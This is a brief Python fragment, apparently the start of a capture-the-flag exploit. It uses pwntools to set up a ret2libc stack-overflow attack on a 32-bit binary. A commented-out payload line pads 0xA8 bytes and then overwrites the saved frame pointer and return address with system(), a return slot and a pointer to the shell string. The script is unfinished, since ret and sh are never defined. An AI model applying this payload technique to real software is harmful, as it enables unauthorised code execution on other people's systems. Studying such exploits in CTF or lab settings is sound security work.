from pwn import *
oebp=1
system=0x556b1920
off_system=0x3EED0

# pay="A"*0xA8+p32(oebp)+p32(system)+p32(ret)+p32(sh)
